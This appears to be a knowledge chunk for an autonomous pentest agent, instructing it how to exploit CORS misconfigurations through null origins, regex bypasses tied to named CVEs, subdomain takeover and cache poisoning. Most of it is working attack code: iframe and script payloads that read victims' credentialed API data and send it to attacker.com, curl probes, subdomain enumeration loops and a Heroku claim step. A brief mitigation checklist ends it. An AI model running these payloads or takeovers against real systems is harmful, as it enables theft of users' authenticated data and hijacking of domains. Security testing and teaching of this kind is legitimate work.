# CORS Null Origin & Subdomain Takeover Chaining — Agent Chunk 84a
> Source: CVE databases (2025-2026), Litestar/Jupyter/sanic-cors/Netty advisories, PortSwigger CORS research, subdomain takeover methodologies
> Purpose: Teaches the agent to exploit CORS misconfigurations including null origin, regex bypasses, subdomain takeover chaining, and cache poisoning
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing CORS configurations on API endpoints. Start with null origin testing, then probe for regex bypass patterns. If subdomains are in scope, check for dangling DNS records that enable subdomain takeover + CORS chaining. Always test in both pre-flight (OPTIONS) and simple request contexts.

---

## 1. Null Origin Exploitation

### Why Null Origin Exists
The `Origin: null` header is sent by browsers in these contexts:
- Sandboxed iframes (`<iframe sandbox="allow-scripts">`)
- Local file:// pages
- Cross-origin redirects in specific sequences
- Data URIs
- Certain privacy/incognito mode behaviors

### Vulnerable Configuration
```
# Server CORS config that trusts null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### Exploitation Payload
```html
<!-- Host this on attacker.com -->
<!-- Sandboxed iframe sends Origin: null -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
  fetch('https://api.target.com/api/user/profile', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate victim's data
    new Image().src = 'https://attacker.com/steal?data=' +
      encodeURIComponent(JSON.stringify(data));
  });
</script>
"></iframe>
```

### Testing for Null Origin
```bash
# Test if API reflects null origin
curl -s -D- https://api.target.com/api/user/profile \
  -H "Origin: null" \
  -H "Cookie: session=valid_session_cookie" | \
  grep -i "access-control"

# Expected vulnerable response:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

---

## 2. Subdomain Takeover + CORS Chaining

### Step-by-Step Attack

**Step 1: Enumerate subdomains**
```bash
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o amass_subdomains.txt
cat subdomains.txt amass_subdomains.txt | sort -u > all_subdomains.txt
```

**Step 2: Check for dangling DNS (takeover candidates)**
```bash
# Check for CNAME records pointing to unclaimed services
for sub in $(cat all_subdomains.txt); do
  cname=$(dig +short CNAME $sub)
  if [ -n "$cname" ]; then
    echo "$sub -> $cname"
    # Check if CNAME target is claimable
    curl -s -o /dev/null -w "%{http_code}" "http://$cname"
  fi
done

# Common takeover targets:
# *.s3.amazonaws.com          -> NoSuchBucket
# *.herokuapp.com             -> No such app
# *.github.io                 -> 404
# *.azurewebsites.net         -> Default Azure page
# *.cloudfront.net            -> Bad Request
# *.shopify.com               -> Store not found
```

**Step 3: Verify CORS trusts subdomains**
```bash
# Test if API accepts subdomain origins
curl -s -D- https://api.target.com/api/user/data \
  -H "Origin: https://old-blog.target.com" \
  -H "Cookie: session=valid_cookie" | \
  grep -i "access-control-allow-origin"

# If response shows:
# Access-Control-Allow-Origin: https://old-blog.target.com
# Access-Control-Allow-Credentials: true
# -> Takeover old-blog.target.com to steal data cross-origin
```

**Step 4: Claim the subdomain and host exploit**
```bash
# Example: old-blog.target.com CNAME -> old-blog.herokuapp.com (unclaimed)
# Create Heroku app with name "old-blog"
heroku create old-blog

# Deploy exploit page
cat > index.html << 'EOF'
<script>
fetch('https://api.target.com/api/user/data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
EOF
```

---

## 3. CORS Regex Bypass CVEs

### CVE-2026-25478: Litestar Framework
```python
# Litestar used unanchored regex for origin validation
# Configuration:
allowed_origins = ["https://trusted.example.com"]

# Generated regex (vulnerable):
# re.match("https://trusted.example.com", origin)
# Missing end anchor ($), so these bypass:
# https://trusted.example.com.attacker.com  -> matches
# https://trusted.example.comevil.com       -> matches

# Test:
curl -s -D- https://api.target.com/api/data \
  -H "Origin: https://trusted.example.com.attacker.com" | \
  grep "Access-Control-Allow-Origin"
```

### CVE-2026-40110: Jupyter Server
```python
# Jupyter Server failed to escape dots in origin regex
# Configuration:
allow_origin_pat = "https://notebook\.example\.com"

# But implementation built regex without escaping:
# Pattern: https://notebook.example.com
# Dot matches any character, so:
# https://notebookXexampleYcom.attacker.com  -> matches

# Test:
curl -s -D- https://jupyter.target.com/api/contents \
  -H "Origin: https://notebookXexampleYcom.attacker.com" | \
  grep "Access-Control-Allow-Origin"
```

### CVE-2026-37737: sanic-cors
```python
# sanic-cors allowed regex patterns but did not anchor them
# Any substring match was sufficient

# Configuration:
CORS(app, origins=r"https://app\.target\.com")

# Bypass origins (unanchored regex matches substring):
# https://app.target.com.evil.com
# https://evil.com/https://app.target.com
# https://aaaapp.target.commmm.evil.com

# Test all variants:
for origin in \
  "https://app.target.com.evil.com" \
  "https://evil.com?r=https://app.target.com" \
  "https://aaapp.target.comevil.com"; do
  echo "Testing: $origin"
  curl -s -D- https://api.target.com/endpoint \
    -H "Origin: $origin" | grep -i "access-control-allow-origin"
done
```

### Common Regex Bypass Patterns
```
# If allowed origin is: https://example.com

# Missing end anchor ($):
https://example.com.attacker.com
https://example.com-attacker.com

# Unescaped dots:
https://exampleXcom.attacker.com

# Missing start anchor (^):
https://attacker.com/https://example.com

# Subdomain prefix injection:
https://attackerexample.com

# Null byte injection:
https://example.com%00.attacker.com
```

---

## 4. Vary Header Cache Poisoning

### CVE-2026-59903: Netty Framework
```bash
# Netty's CORS handler did not always include Vary: Origin
# in responses, enabling CDN cache poisoning

# Attack scenario:
# 1. CDN caches response for /api/public/data
# 2. Attacker sends request with malicious Origin
# 3. Server responds with ACAO: attacker.com (no Vary: Origin)
# 4. CDN caches this response
# 5. Legitimate users receive cached response with ACAO: attacker.com

# Step 1: Poison the cache
curl -H "Origin: https://attacker.com" \
  https://cdn.target.com/api/public/data

# Step 2: Verify poisoned cache
curl -D- https://cdn.target.com/api/public/data
# Response includes:
# Access-Control-Allow-Origin: https://attacker.com  (cached from step 1)
# X-Cache: HIT

# Step 3: Exploit - any page on attacker.com can now read the response
# because the cached ACAO header allows it
```

### Correct Vary Header Behavior
```
# Every CORS response MUST include:
Vary: Origin

# For requests with credentials:
Vary: Origin, Cookie

# This tells CDNs to cache separately per Origin value
```

---

## 5. Pre-flight Cache Poisoning

```bash
# Pre-flight responses (OPTIONS) can be cached by the browser
# Access-Control-Max-Age controls cache duration

# Attack: If OPTIONS response is cached with permissive CORS:
# 1. Attacker triggers OPTIONS to /api/sensitive with malicious origin
# 2. Server reflects origin in pre-flight response
# 3. Browser caches pre-flight for Access-Control-Max-Age seconds
# 4. Subsequent credentialed requests skip pre-flight check

# Test pre-flight caching:
curl -X OPTIONS https://api.target.com/api/data \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -D-

# Check for long max-age values:
# Access-Control-Max-Age: 86400  (24 hours - too long!)
# Safe: Access-Control-Max-Age: 600  (10 minutes)
```

---

## 6. Mitigation Checklist
- Never reflect `null` in Access-Control-Allow-Origin with credentials
- Use exact string matching for origin validation, not regex
- If regex is required: anchor both ends (`^...$`), escape dots (`\.`)
- Always include `Vary: Origin` in CORS responses
- Keep `Access-Control-Max-Age` under 600 seconds
- Audit subdomains regularly; remove dangling DNS records
- Do not use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers reject this, but test for misunderstanding)
- Implement Content Security Policy as defense-in-depth
